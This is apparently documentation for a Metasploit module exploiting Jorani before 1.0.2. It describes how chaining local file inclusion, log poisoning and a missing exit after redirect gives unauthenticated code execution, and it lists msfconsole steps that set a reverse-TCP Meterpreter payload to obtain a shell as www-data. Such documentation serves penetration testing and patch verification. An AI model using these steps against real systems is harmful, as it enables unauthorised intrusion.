## Vulnerable Application

Jorani prior to 1.0.2 allows unauthenticated users to execute arbitrary code.

This is due to a lack of sanitization on the language parameter, which can lead to the file inclusion of arbitrary ".php" files.

Moreover, the log file for jorani ends with ".php" in Jorani < 1.0.2.

Log poisoning is possible, an attacker can abuse this to store malicious data in the log file.

Data like '<?php ...;?>' can been added to the log file, then if this file is included by php, it will be executed.

Finally, the controller responsible for recovering a page doesn't properly redirect requests made by Ajax.

So the scripts will not stop after the redirection because an exit statement is missing.

Because of this, the attacker can make the script continue and reach the LFI vulnerability without being authenticated.

So by chaining theses 3 vulnerabilities an unauthenticated user can execute arbitrary code on the application.

This module has been tested successfully on Jorani 1.0.0, Ubuntu 20.04 (x86_64) with kernel version 5.15.0-75.

### Installation Steps
For a step by step installation tutorial on Ubuntu please refer to [How to install Jorani](https://jorani.org/how-to-install-jorani.html)

## Verification Steps
1. Start `msfconsole`
2. `use exploit/multi/php/jorani_path_trav`
3. set `RHOSTS` and `RPORT`
4. Confirm the target is vulnerable: `check`. The result expected is `The target appears to be vulnerable.`
5. Default payload for the exploit will be `php/meterpreter/reverse_tcp`
6. set `LHOST`
7. `exploit`
8. Confirm you have now a cmd session as www-data

## Options

### TARGETURI (optional)
The path to the jorani website. By default it is empty.
